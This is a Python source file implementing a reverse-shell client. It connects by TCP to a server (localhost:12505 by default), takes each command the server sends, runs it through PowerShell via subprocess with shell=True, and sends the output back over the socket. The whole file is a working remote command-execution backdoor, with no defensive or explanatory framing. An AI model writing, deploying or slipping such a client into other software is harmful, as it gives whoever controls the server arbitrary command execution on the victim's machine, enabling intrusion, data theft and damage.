import socket
import subprocess

class Client:
    def __init__(self, host='127.0.0.1', port=12505):
        self.host = host
        self.port = port
        self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def connect(self):
        try:
            self.client_socket.connect((self.host, self.port))
            print(f"Connected to server at {self.host}:{self.port}")
            self.receive_commands()
        except Exception as e:
            print(f"Error connecting to server: {e}")
        finally:
            self.client_socket.close()

    def receive_commands(self):
        try:
            while True:
                command = self.client_socket.recv(4096).decode('utf-8').strip()
                if not command:
                    break

                output = self.execute_powershell_command(command)
                self.send_output(output)
        except Exception as e:
            print(f"Error receiving or executing commands: {e}")

    def execute_powershell_command(self, command):
        try:
            if command.lower() == 'quit':
                return "Quitting..."
            elif command.startswith("cd "):
                return "Changing directory in PowerShell not supported."
            else:
                # Execute PowerShell command using subprocess.Popen
                process = subprocess.Popen(['powershell.exe', '-Command', command],
                                           stdout=subprocess.PIPE,
                                           stderr=subprocess.PIPE,
                                           stdin=subprocess.PIPE,
                                           text=True,
                                           shell=True)
                stdout, stderr = process.communicate()

                if stderr:
                    return f"PowerShell command failed: {stderr.strip()}"
                else:
                    return stdout.strip()
        except Exception as e:
            return f"Error: {str(e)}"

    def send_output(self, output):
        try:
            self.client_socket.sendall(output.encode('utf-8'))
        except Exception as e:
            print(f"Error sending output to server: {e}")

if __name__ == "__main__":
    client = Client()
    client.connect()
